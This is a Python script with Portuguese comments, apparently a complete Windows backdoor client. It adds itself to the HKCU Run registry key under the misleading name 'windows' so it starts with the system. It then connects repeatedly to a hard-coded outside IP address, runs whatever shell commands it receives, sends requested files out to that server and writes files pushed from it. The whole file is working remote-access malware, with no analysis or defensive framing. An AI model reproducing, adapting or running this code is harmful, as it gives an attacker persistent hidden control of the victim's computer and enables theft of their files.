import socket
import subprocess
import os
import sys
import time
import winreg as reg  # Módulo para manipular o registro do Windows

# Configurações do servidor
SERVER_IP = "170.239.144.88"  # Substitua pelo IP do servidor
SERVER_PORT = 8000           # Substitua pela porta desejada

# Função para adicionar ao Registro do Windows para iniciar automaticamente
def add_to_registry():
    script_path = sys.argv[0]  # Pega o caminho completo do script ou executável
    try:
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_WRITE)
        reg.SetValueEx(reg_key, "windows", 0, reg.REG_SZ, script_path)  # "ClientApp" é o nome da chave no Registro
        reg.CloseKey(reg_key)
        print("[+] Programa adicionado ao Registro para iniciar com o Windows.")
    except Exception as e:
        print(f"[-] Erro ao adicionar ao Registro: {e}")

# Função principal do cliente
def connect_to_server():
    # Define o diretório inicial como o diretório do usuário
    home_dir = os.path.expanduser("~")  # Obtém o diretório inicial do usuário
    os.chdir(home_dir)
    current_dir = os.getcwd()  # Diretório atual do cliente
    print(f"[+] Diretório inicial configurado como: {current_dir}")

    while True:
        try:
            print("[+] Conectando ao Servidor...")
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((SERVER_IP, SERVER_PORT))
            print("[+] Servidor Conectado.")

            # Loop de comunicação com o servidor
            while True:
                try:
                    # Recebe o comando do servidor
                    command = client.recv(4096).decode("utf-8").strip()
                    if not command:
                        print("[-] Nenhum comando recebido. Fechando conexão.")
                        break

                    print(f"[+] Comando Recebido: {command}")

                    # Encerra a conexão se o comando for 'exit'
                    if command.lower() == "exit":
                        print("[+] Comando de saída recebido. Fechando conexão.")
                        break

                    # Comando 'cd' para navegar entre pastas
                    if command.startswith("cd "):
                        new_dir = command.split(" ", 1)[1]
                        try:
                            os.chdir(new_dir)
                            current_dir = os.getcwd()
                            client.send(f"Diretório alterado para {current_dir}".encode("utf-8"))
                        except FileNotFoundError:
                            client.send(f"Erro: Diretório não encontrado: {new_dir}".encode("utf-8"))
                        continue

                    # Comando 'cd' sem argumentos (volta para o diretório inicial)
                    if command.strip() == "cd":
                        os.chdir(home_dir)  # Volta para o diretório do usuário
                        current_dir = os.getcwd()
                        client.send(f"Diretório alterado para {current_dir}".encode("utf-8"))
                        continue

                    # Processa comando de download (enviar arquivo para o servidor)
                    if command.startswith("download "):
                        file_path = command.split(" ", 1)[1]
                        if os.path.exists(file_path):
                            with open(file_path, "rb") as file:
                                while chunk := file.read(4096):
                                    client.send(chunk)
                                client.send(b"EOF")  # Indica o fim do arquivo
                        else:
                            client.send(b"Erro: Arquivo não encontrado")
                        continue

                    # Processa comando de upload (receber arquivo do servidor)
                    if command.startswith("upload "):
                        file_path = command.split(" ", 1)[1]
                        with open(file_path, "wb") as file:
                            while True:
                                chunk = client.recv(4096)
                                if chunk.endswith(b"EOF"):
                                    file.write(chunk[:-3])  # Remove o marcador EOF
                                    break
                                file.write(chunk)
                        client.send(b"File uploaded successfully")
                        continue

                    # Executa comando do shell
                    print(f"[+] Executando comando: {command}")
                    result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=current_dir)
                    output = result.stdout + result.stderr
                    if not output.strip():
                        output = "Command executed with no output"
                    client.send(output.encode("utf-8"))
                except Exception as e:
                    error_msg = f"Error: {e}"
                    print(f"[-] {error_msg}")
                    client.send(error_msg.encode("utf-8"))
                    break

        except (ConnectionResetError, socket.error) as e:
            print(f"[-] Erro de conexão: {e}")
            print("[+] Tentando reconectar em 5 segundos...")
            time.sleep(5)  # Espera 5 segundos antes de tentar reconectar
        except Exception as e:
            print(f"[-] Erro Inesperado: {e}")
            print("[+] Tentando reconectar em 5 segundos...")
            time.sleep(5)  # Espera 5 segundos antes de tentar reconectar

# Adiciona o programa ao Registro para iniciar com o Windows
add_to_registry()

# Conecta ao servidor e executa o cliente
connect_to_server()
